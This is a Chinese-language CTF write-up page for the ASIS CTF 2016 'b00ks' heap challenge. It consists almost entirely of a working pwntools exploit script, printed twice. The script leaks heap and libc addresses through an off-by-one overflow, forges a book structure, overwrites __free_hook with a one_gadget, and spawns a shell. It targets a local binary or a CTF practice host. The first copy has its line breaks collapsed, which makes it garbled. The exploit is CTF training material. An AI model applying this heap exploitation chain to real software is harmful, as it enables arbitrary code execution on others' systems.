# 漏洞学习之PWN-ASIS_CTF_2016_b00ks

> 原文: https://www.ctfiot.com/89361.html
> ID: 89361

Pythonfrom pwn import *import pdbfrom LibcSearcher import *# -*- coding: utf-8 -*- # context.log_level = 'debug'debug = 1

if (debug): p = process("./ASIS_CTF_2016_b00ks")else: p = remote('node4.buuoj.cn', 27816)

# context(arch='i386',os='linux')

elf = ELF('ASIS_CTF_2016_b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def Create(nsize, name, dsize, desc): p.sendlineafter("> ", '1') p.sendlineafter("name size: ", str(nsize)) p.sendlineafter("name (Max 32 chars): ", name) p.sendlineafter("description size: ", str(dsize)) p.sendlineafter("description: ", desc)

def Delete(idx): p.sendlineafter("> ", '2') p.sendlineafter("delete: ", str(idx))

def Edit(idx, desc): p.sendlineafter("> ", '3') p.sendlineafter("edit: ", str(idx)) p.sendlineafter("description: ", desc)

def Print(): p.sendlineafter("> ", '4')

def Change(name): p.sendlineafter("> ", '5') p.sendlineafter("name: ", name)

## leak_heapp.sendlineafter("name: ",b'A'*0x20)Create(0xd0,"AAAA",0x20,"AAAA") #book1Create(0x21000,"BBBB",0x21000,"BBBB") #book2

Print()

p.recvuntil("A" * 0x20)book1_addr = u64(p.recvn(6)+b'x00'+b'x00')

log.info("book1_addr: "+hex(book1_addr))book2_addr = book1_addr + 0x30log.info("book2 address: 0x%x" % book2_addr)

## fakefake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)Edit(1, fake_book)Change("A" * 0x20)

Print()

## libc_basep.recvuntil("Name: ")leak_addr = u64(p.recvn(6)+b'x00'+b'x00')libc_base = leak_addr - 0x5b0010 # mmap_addr - libc_baselog.info("libc address: 0x%x" % libc_base)

one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

## pwnfree_hook = libc.symbols['__free_hook'] + libc_baseone_gadget = libc_base + one_gadget[1]

fake_book = p64(free_hook) * 2Edit(1, fake_book)fake_book = p64(one_gadget)Edit(2, fake_book)

Delete(2)
# pdb.set_trace()
p.interactive()


```
Pythonfrom pwn import *import pdbfrom LibcSearcher import *# -*- coding: utf-8 -*- # context.log_level = 'debug'debug = 1

if (debug): p = process("./ASIS_CTF_2016_b00ks")else: p = remote('node4.buuoj.cn', 27816)

# context(arch='i386',os='linux')

elf = ELF('ASIS_CTF_2016_b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def Create(nsize, name, dsize, desc): p.sendlineafter("> ", '1') p.sendlineafter("name size: ", str(nsize)) p.sendlineafter("name (Max 32 chars): ", name) p.sendlineafter("description size: ", str(dsize)) p.sendlineafter("description: ", desc)

def Delete(idx): p.sendlineafter("> ", '2') p.sendlineafter("delete: ", str(idx))

def Edit(idx, desc): p.sendlineafter("> ", '3') p.sendlineafter("edit: ", str(idx)) p.sendlineafter("description: ", desc)

def Print(): p.sendlineafter("> ", '4')

def Change(name): p.sendlineafter("> ", '5') p.sendlineafter("name: ", name)

## leak_heapp.sendlineafter("name: ",b'A'*0x20)Create(0xd0,"AAAA",0x20,"AAAA") #book1Create(0x21000,"BBBB",0x21000,"BBBB") #book2

Print()

p.recvuntil("A" * 0x20)book1_addr = u64(p.recvn(6)+b'x00'+b'x00')

log.info("book1_addr: "+hex(book1_addr))book2_addr = book1_addr + 0x30log.info("book2 address: 0x%x" % book2_addr)

## fakefake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)Edit(1, fake_book)Change("A" * 0x20)

Print()

## libc_basep.recvuntil("Name: ")leak_addr = u64(p.recvn(6)+b'x00'+b'x00')libc_base = leak_addr - 0x5b0010 # mmap_addr - libc_baselog.info("libc address: 0x%x" % libc_base)

one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

## pwnfree_hook = libc.symbols['__free_hook'] + libc_baseone_gadget = libc_base + one_gadget[1]

fake_book = p64(free_hook) * 2Edit(1, fake_book)fake_book = p64(one_gadget)Edit(2, fake_book)

Delete(2)
# pdb.set_trace()
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1672539879.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1672539881.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672539882.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1672539882.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672539883.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1672539884.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1672539886.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1672539887.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672539888.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672539889.png)